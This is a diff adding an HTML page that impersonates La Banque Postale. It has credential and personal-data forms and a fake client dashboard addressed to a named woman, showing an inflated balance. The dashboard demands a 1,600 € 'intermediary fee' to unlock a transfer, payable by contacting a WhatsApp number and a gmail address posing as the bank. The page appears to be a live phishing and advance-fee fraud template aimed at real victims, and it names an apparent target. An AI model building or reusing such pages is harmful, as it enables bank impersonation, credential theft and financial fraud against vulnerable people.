@@ -1,0 +1,299 @@
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>La Banque Postale - Banque et Assurance</title>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header class="header">
+        <div class="header-container">
+            <div class="logo">
+                <img src="logo_la_banque_postale.png" alt="La Banque Postale Logo">
+                <span class="logo-text">La Banque Postale</span>
+            </div>
+            <nav>
+                <ul class="nav-menu">
+                    <li><a href="#">Particuliers</a></li>
+                    <li><a href="#">Changer de site</a></li>
+                </ul>
+            </nav>
+            <div class="header-actions">
+                <button class="search-icon"><img src="search_icon.png" alt="Rechercher"></button>
+                <button class="btn-secondary" id="btnRegisterHeader" onclick="openModal('registerModal')">S'inscrire</button>
+                <button class="btn-primary" id="btnLoginHeader" onclick="openModal('loginModal')">Se connecter</button>
+                <button class="mobile-menu-toggle" onclick="toggleMobileMenu()">
+                    <img src="menu_icon.png" alt="Menu">
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <section class="promo-section" style="background-image: url('habitation_promo_background.png');">
+            <div class="promo-overlay"></div>
+            <div class="promo-content">
+                <h1 class="promo-title">Offre Assurance Habitation</h1>
+                <p class="promo-subtitle">Profitez de 2 mois gratuits (1) pour toute souscription du 1er juin 2025 au 3 août 2025.</p>
+                <button class="btn-primary" onclick="window.location.href='#services'">Découvrir notre offre</button>
+            </div>
+        </section>
+
+        <section class="services-section" id="services">
+            <div class="services-container">
+                <h2 style="text-align: center; font-size: 36px; margin-bottom: 20px; color: #003d7a;">Nos services</h2>
+                <div class="services-grid">
+                    <div class="service-card">
+                        <div class="service-icon"><img src="service_comptes_cartes.png" alt="Icone Comptes et cartes"></div>
+                        <h3>Comptes et cartes</h3>
+                        <p>Gérez vos comptes et vos cartes bancaires en toute simplicité</p>
+                    </div>
+                    <div class="service-card">
+                        <div class="service-icon"><img src="promo_credits.png" alt="Icone Crédits immobiliers"></div>
+                        <h3>Crédits immobiliers</h3>
+                        <p>Financez votre projet immobilier avec nos solutions adaptées</p>
+                    </div>
+                    <div class="service-card">
+                        <div class="service-icon"><img src="promo_epargne.png" alt="Icone Épargne et placements"></div>
+                        <h3>Épargne et placements</h3>
+                        <p>Faites fructifier votre épargne avec nos produits d'investissement</p>
+                    </div>
+                    <div class="service-card">
+                        <div class="service-icon"><img src="promo_assurance.png" alt="Icone Assurance"></div>
+                        <h3>Assurance</h3>
+                        <p>Protégez ce qui compte pour vous avec nos assurances</p>
+                    </div>
+                    <div class="service-card">
+                        <div class="service-icon"><img src="service_digital_banking.png" alt="Icone Banque digitale"></div>
+                        <h3>Banque digitale</h3>
+                        <p>Accédez à vos comptes 24h/24 via notre application mobile</p>
+                    </div>
+                    <div class="service-card">
+                        <div class="service-icon"><img src="service_conseiller.png" alt="Icone Conseiller personnel"></div>
+                        <h3>Conseiller personnel</h3>
+                        <p>Bénéficiez de l'accompagnement de nos conseillers experts</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="digital-banking-promo">
+            <div class="services-container">
+                <div class="digital-content">
+                    <div class="digital-text">
+                        <h2>Votre banque à portée de main</h2>
+                        <p>Gérez vos comptes, effectuez des virements et consultez vos relevés où que vous soyez avec notre application mobile et votre espace client en ligne.</p>
+                        <button class="btn-primary" onclick="openModal('loginModal')">Accéder à mon espace</button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="contact-section" id="contact">
+            <div class="services-container">
+                <h2 style="font-size: 36px; margin-bottom: 20px;">Nous contacter</h2>
+                <p style="font-size: 18px; margin-bottom: 30px;">Notre équipe est à votre disposition pour répondre à toutes vos questions</p>
+                <div style="display: flex; justify-content: center; align-items: center; gap: 20px; flex-wrap: wrap;">
+                    <div>
+                        <h3>Service client</h3>
+                        <p>📧 labanquepostaleofficiel@gmail.com</p>
+                        <p>📞 3639 (Service gratuit + prix appel)</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="dashboard" id="dashboard">
+            <div class="dashboard-container">
+                <!-- Connexion Jacqueline Poety avec Solde -->
+                <div class="dashboard-header">
+                    <div class="user-info">
+                        <h2 id="dashboardUserName">Bonjour Madame Mboungou Chantre Flore</h2>
+                        <p>Bienvenue dans votre espace personnel La Banque Postale</p>
+                    </div>
+                    <button class="btn-secondary" onclick="logout()">Se déconnecter</button>
+                </div>
+                
+                <div class="account-restriction-message" id="accountRestrictionMessage">
+                    <p><strong>Alerte :</strong> Votre compte est temporairement restreint en raison d'une non-authentification. Veuillez contacter <strong>labanquepostaleofficiel@gmail.com</strong> pour plus d'informations.</p>
+                </div>
+                
+                <div class="account-balance">
+                    <h3>Solde de votre compte</h3>
+                    <div class="balance-amount" id="dashboardBalance">50 000,00 €</div>
+                    <p>Compte Courant - **** 1234</p>
+                </div>
+
+                <!-- Restriction et Paiement Jacqueline Poety -->
+                <div id="paymentPrompt" class="payment-prompt" style="display: none;">
+                    <p>Pour débloquer votre virement de 100 000,86 €, vous devez régler les frais intermédiaires de 1 600,00 €.</p>
+                    <button id="payFeeButton" class="btn-primary">Payer les frais</button>
+                </div>
+
+                <div class="dashboard-grid">
+                    <div class="dashboard-card">
+                        <h3>🔄 Dernières opérations</h3>
+                        <ul id="transactionList" style="list-style: none; padding: 0;">
+                            <li style="padding: 10px 0; border-bottom: 1px solid #eee;">
+                                <strong>Virement reçu</strong><br>
+                                <small>30/07/2025 - 11:29 AM - +50 000,00 €</small>
+                            </li>
+                            <li style="padding: 10px 0; border-bottom: 1px solid #eee;">
+                                <strong>Prélèvement EDF</strong><br>
+                                <small>14/12/2024 - -89,50 €</small>
+                            </li>
+                            <li style="padding: 10px 0;">
+                                <strong>Virement émis</strong><br>
+                                <small>13/12/2024 - -450,00 €</small>
+                            </li>
+                        </ul>
+                    </div>
+                    
+                    <div class="dashboard-card">
+                        <h3>💳 Mes cartes</h3>
+                        <div style="background: linear-gradient(135deg, #003d7a, #0056b3); color: white; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <p><strong>Carte Visa Premier</strong></p>
+                            <p style="font-family: monospace; font-size: 18px; margin: 10px 0;">**** **** **** 1234</p>
+                            <p><small>Expire le 12/28</small></p>
+                        </div>
+                        <button class="btn-primary" style="width: 100%;">Gérer ma carte</button>
+                    </div>
+                    
+                    <div class="dashboard-card">
+                        <h3>📊 Mes produits</h3>
+                        <ul style="list-style: none; padding: 0;">
+                            <li style="padding: 10px 0; border-bottom: 1px solid #eee;">
+                                <strong>Livret A</strong><br>
+                                <small>Solde: 15 230,45 €</small>
+                            </li>
+                            <li style="padding: 10px 0; border-bottom: 1px solid #eee;">
+                                <strong>Assurance Habitation</strong><br>
+                                <small>Contrat n°AH789456</small>
+                            </li>
+                            <li style="padding: 10px 0;">
+                                <strong>PEL</strong><br>
+                                <small>Solde: 8 500,00 €</small>
+                            </li>
+                        </ul>
+                    </div>
+                    
+                    <div class="dashboard-card">
+                        <h3>🔔 Messages</h3>
+                        <div style="background: #e3f2fd; padding: 15px; border-radius: 4px; margin: 15px 0;">
+                            <p><strong>Nouveau relevé disponible</strong></p>
+                            <small>Votre relevé de décembre est disponible dans votre espace documents.</small>
+                        </div>
+                        <button class="btn-primary" style="width: 100%;">Voir tous les messages</button>
+                    </div>
+                </div>
+
+                <div class="dashboard-promos">
+                    <h2 class="promos-title">Découvrez nos offres et services</h2>
+                    <div class="promos-grid">
+                        <div class="promo-card">
+                            <img src="promo_pub_young_woman.png" alt="Publicité Femme" class="promo-img">
+                            <h3>Protégez votre famille</h3>
+                            <p>Découvrez nos solutions d'assurance adaptées à vos besoins.</p>
+                            <button class="btn-primary">En savoir plus</button>
+                        </div>
+                        <div class="promo-card">
+                            <img src="promo_epargne.png" alt="Épargne" class="promo-img">
+                            <h3>Faites fructifier votre épargne</h3>
+                            <p>Des produits d'investissement pour tous vos projets.</p>
+                            <button class="btn-primary">Voir les offres</button>
+                        </div>
+                        <div class="promo-card">
+                            <img src="promo_credits.png" alt="Crédits" class="promo-img">
+                            <h3>Financez vos projets</h3>
+                            <p>Solutions de crédits immobiliers et personnels sur mesure.</p>
+                            <button class="btn-primary">Simuler un crédit</button>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="services-container">
+            <p>&copy; 2024 La Banque Postale - Tous droits réservés</p>
+            <p>Établissement de crédit - Société Anonyme au capital de 5 000 000 000 euros</p>
+        </div>
+    </footer>
+
+    <!-- Login Modal -->
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('loginModal')">&times;</span>
+            <h2 style="color: #003d7a; margin-bottom: 30px;">Connexion à votre espace</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="loginEmail">Adresse e-mail</label>
+                    <input type="email" id="loginEmail" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="loginPassword">Mot de passe</label>
+                    <input type="password" id="loginPassword" name="password" required>
+                </div>
+                <button type="submit" class="btn-primary" style="width: 100%; margin-top: 20px;">Se connecter</button>
+            </form>
+            <p style="text-align: center; margin-top: 20px;">
+                <a href="#" style="color: #003d7a;">Mot de passe oublié ?</a>
+            </p>
+        </div>
+    </div>
+
+    <!-- Register Modal -->
+    <div id="registerModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('registerModal')">&times;</span>
+            <h2 style="color: #003d7a; margin-bottom: 30px;">Créer votre compte</h2>
+            <form id="registerForm">
+                <div class="form-group">
+                    <label for="registerFirstName">Prénom</label>
+                    <input type="text" id="registerFirstName" name="firstName" required>
+                </div>
+                <div class="form-group">
+                    <label for="registerLastName">Nom</label>
+                    <input type="text" id="registerLastName" name="lastName" required>
+                </div>
+                <div class="form-group">
+                    <label for="registerEmail">Adresse e-mail</label>
+                    <input type="email" id="registerEmail" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="registerPhone">Téléphone</label>
+                    <input type="tel" id="registerPhone" name="phone" required>
+                </div>
+                <div class="form-group">
+                    <label for="registerAddress">Adresse</label>
+                    <input type="text" id="registerAddress" name="address" required>
+                </div>
+                <div class="form-group">
+                    <label for="registerPassword">Mot de passe</label>
+                    <input type="password" id="registerPassword" name="password" required>
+                </div>
+                <button type="submit" class="btn-primary" style="width: 100%; margin-top: 20px;">Créer mon compte</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- WhatsApp Contact Modal -->
+    <div id="whatsappContactModal" class="modal">
+        <div class="modal-content whatsapp-contact-modal">
+            <span class="close" onclick="closeModal('whatsappContactModal')">&times;</span>
+            <h2 style="color: #003d7a; margin-bottom: 20px;">Contactez-nous via WhatsApp</h2>
+            <p style="margin-bottom: 30px;">Pour régler les frais et débloquer votre virement, veuillez contacter notre service client via WhatsApp :</p>
+            <div class="whatsapp-info">
+                <img src="whatsapp_icon.png" alt="WhatsApp Icon" class="whatsapp-icon">
+                <a href="https://wa.me/237673421422" target="_blank" class="whatsapp-number">+237 6 73 42 14 22</a>
+            </div>
+            <button id="confirmPaymentButton" class="btn-primary" style="width: 100%; margin-top: 30px;">J'ai effectué le paiement</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
